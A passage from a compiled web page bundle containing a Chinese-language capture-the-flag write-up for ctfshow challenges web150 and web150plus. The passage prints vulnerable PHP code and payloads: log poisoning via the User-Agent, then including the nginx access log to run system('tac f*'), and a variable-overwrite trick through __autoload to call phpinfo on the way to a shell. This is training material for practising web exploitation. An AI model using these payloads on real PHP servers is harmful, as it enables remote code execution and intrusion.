$_POST[\'ctf\'];\r\nextract($_GET);\r\nif(class_exists($__CTFSHOW__)){\r\n    echo "class is exists!";\r\n}\r\n\r\nif($isVIP && strrpos($ctf, ":")===FALSE){\r\n    include($ctf);\r\n}\n'})}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsxs)(e.p,{children:["\u8fd9\u91cc\u6709",(0,c.jsx)(e.strong,{children:"extract($_GET);"})]}),"\n",(0,c.jsx)(e.p,{children:"\u6240\u4ee5isVIP\u662f\u53ef\u63a7\u7684"}),"\n"]}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsx)(e.p,{children:"\u5148\u5f80index.php\u91ccUA\u5199\u5165\u4e00\u53e5\u8bdd"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"GET:isVIP=1\r\nPOST:ctf=/var/log/nginx/access.log&1=system('tac f*');\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web150plus__autoload\u52a0\u8f7d\u672a\u5b9a\u4e49\u7684\u7c7b",children:"web150plus(__autoload\u52a0\u8f7d\u672a\u5b9a\u4e49\u7684\u7c7b)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\r\ninclude("flag.php");\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n\r\nclass CTFSHOW{\r\n    private $username;\r\n    private $password;\r\n    private $vip;\r\n    private $secret;\r\n\r\n    function __construct(){\r\n        $this->vip = 0;\r\n        $this->secret = $flag;\r\n    }\r\n\r\n    function __destruct(){\r\n        echo $this->secret;\r\n    }\r\n\r\n    public function isVIP(){\r\n        return $this->vip?TRUE:FALSE;\r\n        }\r\n    }\r\n\r\n    function __autoload($class){\r\n        if(isset($class)){\r\n            $class();\r\n    }\r\n}\r\n\r\n#\u8fc7\u6ee4\u5b57\u7b26\r\n$key = $_SERVER[\'QUERY_STRING\'];\r\nif(preg_match(\'/\\_| |\\[|\\]|\\?/\', $key)){\r\n    die("error");\r\n}\r\n$ctf = $_POST[\'ctf\'];\r\nextract($_GET);\r\nif(class_exists($__CTFSHOW__)){\r\n    echo "class is exists!";\r\n}\r\n\r\nif($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){\r\n    include($ctf);\r\n}\n'})}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"class_exists \u2014 \u67e5\u7c7b\u662f\u5426\u5df2\u7ecf\u5b9a\u4e49"}),"\n",(0,c.jsx)(e.p,{children:"__autoload \u2014 \u5c1d\u8bd5\u52a0\u8f7d\u672a\u5b9a\u4e49\u7684\u7c7b"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"\u8fd9\u4e2a\u9898\u4e00\u70b9\u70b9\u5c0f\u5751__autoload()\u51fd\u6570\u4e0d\u662f\u7c7b\u91cc\u9762\u7684\r\n\u6700\u540e\u6784\u9020?..CTFSHOW..=phpinfo\u5c31\u53ef\u4ee5\u770b\u5230phpinfo\u4fe1\u606f\u5566\r\n\u539f\u56e0\u662f..CTFSHOW..\u89e3\u6790\u53d8\u91cf\u6210__CTFSHOW__\u7136\u540e\u8fdb\u884c\u4e86\u53d8\u91cf\u8986\u76d6\uff0c\u56e0\u4e3aCTFSHOW\u662f\u7c7b\u5c31\u4f1a\u4f7f\u7528\r\n__autoload()\u51fd\u6570\u65b9\u6cd5\uff0c\u53bb\u52a0\u8f7d\uff0c\u56e0\u4e3a\u7b49\u4e8ephpinfo\u5c31\u4f1a\u53bb\u52a0\u8f7dphpinfo\r\n\u63a5\u4e0b\u6765\u5c31\u53bbgetshell\u5566\n"})}),"\n"]}),"\n",(0,c.jsx)(e.p,{children:"payload:"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"..CTFSHOW..=phpinfo\n"})})]})}function d(n={}){const{wrapper:e}={...(0,s.R)(),...n.components};return e?(0,c.jsx)(e,{...n,children:(0,c.jsx)(a,{...n})}):a(n)}},8453:(n,e,r)=>{r.d(e,{R:()=>t,x:()=>l});var i=r(6540);const c={},s=i.createContext(c);function t(n){const e=i.useContext(s);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(c):n.components||c:t(n.components),i.createElement(s.Provider,{value:e},n.children)}}}]);